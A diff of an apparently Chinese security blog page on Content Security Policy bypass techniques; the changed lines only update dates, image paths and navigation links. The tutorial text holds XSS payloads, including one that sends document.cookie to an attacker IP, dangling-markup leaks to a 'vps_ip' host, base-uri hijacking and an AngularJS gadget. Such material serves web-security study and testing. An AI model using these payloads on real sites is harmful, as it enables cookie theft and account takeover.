@@ -144,7 +144,7 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2021-06-07 17:38:09
+        <i class="fas fa-edit"></i>&nbsp;2021-07-20 17:38:09
     </span>
     
     
@@ -181,7 +181,7 @@
 <p><strong>绕过方法</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://10.146.110.37:7777?&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也可用window.location/window.open()跳转方法外带数据--&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160730764.png" class="" title="image-20210614160730764">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160730764.png" class="" title="image-20210614160730764">
 
 <h3 id="0x02-meta网页跳转绕过"><a href="#0x02-meta网页跳转绕过" class="headerlink" title="0x02 meta网页跳转绕过"></a>0x02 meta网页跳转绕过</h3><p><strong>绕过条件</strong></p>
 <p>无</p>
@@ -189,7 +189,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://10.146.110.37:7777&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
 
 <p>效果图</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160921062.png" class="" title="image-20210614160921062">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160921062.png" class="" title="image-20210614160921062">
 
 <h3 id="0x03-iframe标签绕过"><a href="#0x03-iframe标签绕过" class="headerlink" title="0x03 iframe标签绕过"></a>0x03 iframe标签绕过</h3><p><strong>条件</strong></p>
 <p>1.一个同源站点存在两个页面，其中一个有CSP保护，一个没有且存在xss漏洞</p>
@@ -200,7 +200,7 @@
 
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--B.html--&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);iframe.src=<span class="string">&quot;http://localhost/CSP/demo3/A.html&quot;</span>;<span class="built_in">document</span>.body.appendChild(iframe);<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);<span class="comment">//setTimeout是为了等待iframe加载完成</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614161923694.png" class="" title="image-20210614161923694">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614161923694.png" class="" title="image-20210614161923694">
 
 <p><strong>其他利用方法</strong></p>
 <p>在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx”页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：<code>&lt; iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></p>
@@ -215,7 +215,7 @@
 <p>绕过方法</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> </span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162055744.png" class="" title="image-20210614162055744">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162055744.png" class="" title="image-20210614162055744">
 
 <p>这里的绕过方法详细说明可以参考链接</p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" >https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf<i class="fas fa-external-link-alt"></i></a></p>
@@ -232,7 +232,7 @@
 
 <p>我们可以发现&lt;script就会被变成一个属性，值为空，之后的<code>nonce=&#39;xxxxx&#39;</code>会被当成我们输入的script标签中的一个属性，成功绕过<code>script-src</code>，<code>&lt;/script</code>就会被变成一个属性，值为空</p>
 <p>火狐浏览器</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162119762.png" class="" title="image-20210614162119762">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162119762.png" class="" title="image-20210614162119762">
 
 <p>上述绕过方法在chrome浏览器不生效，因为在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行。这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略。</p>
 <p>例如<code>&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt;</code>，这里a属性的值为123，所以就可以通过如下pyaload绕过</p>
@@ -241,10 +241,10 @@
 
 <p>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性</p>
 <p>chrome浏览器</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162131003.png" class="" title="image-20210614162131003">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162131003.png" class="" title="image-20210614162131003">
 
 <p>这里查看页面标签已经嵌入成功，但src却执行不了就很奇怪</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162138551.png" class="" title="image-20210614162138551">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162138551.png" class="" title="image-20210614162138551">
 
 <h3 id="0x06-不完整的资源标签获取资源"><a href="#0x06-不完整的资源标签获取资源" class="headerlink" title="0x06 不完整的资源标签获取资源"></a>0x06 不完整的资源标签获取资源</h3><p><strong>条件</strong></p>
 <p>1.可以加载外域资源 (<code>img-src: *</code>)</p>
@@ -256,10 +256,10 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip?a=</span></span></span><br></pre></td></tr></table></figure>
 
 <p>注意这里src只有左边的引号</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162156829.png" class="" title="image-20210614162156829">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162156829.png" class="" title="image-20210614162156829">
 
 <p>chorme下该payload并不会成功，因为chrome不允许发出的url中含有回车或&lt;</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162208999.png" class="" title="image-20210614162208999">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162208999.png" class="" title="image-20210614162208999">
 
 <h3 id="0x07-站点可控静态资源绕过"><a href="#0x07-站点可控静态资源绕过" class="headerlink" title="0x07 站点可控静态资源绕过"></a>0x07 站点可控静态资源绕过</h3><p><strong>条件</strong></p>
 <p>1.可控的静态资源站点在白名单内</p>
@@ -286,7 +286,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;redirect.php?url&#x3D;&#x2F;b&#x2F;test.php</span><br></pre></td></tr></table></figure>
 
 <p>csp限制了<code>/a/</code>目录，而我们的目标脚本在<code>/b/</code>目录下则如果这时候请求redirect页面去访问<code>/b/</code>下的脚本是可以通过csp的检查的</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162229814.png" class="" title="image-20210614162229814">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162229814.png" class="" title="image-20210614162229814">
 
 <h3 id="0x09-Base-uri绕过"><a href="#0x09-Base-uri绕过" class="headerlink" title="0x09 Base-uri绕过"></a>0x09 Base-uri绕过</h3><p><strong>条件</strong></p>
 <ol>
@@ -297,10 +297,10 @@
 <p><strong>demo</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;//10.146.110.37/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162248786.png" class="" title="image-20210614162248786">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162248786.png" class="" title="image-20210614162248786">
 
 <p>如果未设置nonce将无法绕过</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162255139.png" class="" title="image-20210614162255139">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162255139.png" class="" title="image-20210614162255139">
 
 <h3 id="0x10-SVG绕过"><a href="#0x10-SVG绕过" class="headerlink" title="0x10 SVG绕过"></a>0x10 SVG绕过</h3><p><strong>条件</strong></p>
 <p>1.可以上传svg图片</p>
@@ -319,12 +319,12 @@
 
 <p><strong>绕过方法</strong></p>
 <p>构造pdf的XSS放在vps上</p>
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162329478.png" class="" title="image-20210614162329478">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162329478.png" class="" title="image-20210614162329478">
 
 <p>然后在XSS处写入embed标签且src为pdf连接</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip/123.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/07/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162334912.png" class="" title="image-20210614162334912">
+<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162334912.png" class="" title="image-20210614162334912">
 
 <p>但是PDF的XSS并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等</p>
 <p>具体能执行哪些恶意js可以参考这篇<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/microzone/article/details/52850623" >文章<i class="fas fa-external-link-alt"></i></a></p>
@@ -344,18 +344,33 @@
                     <div class="article-prev">
                         <a class="prev"
                            rel="prev"
-                           href="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/"
+                           href="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/"
                         >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">手动搭建nginx+php-fpm+mysql环境--信安之路实验</span>
+                                <span class="post-nav-title-item">PHP的PCRE库回溯问题</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
                     </div>
                 
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">suid提权学习</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
                 
             </div>
         
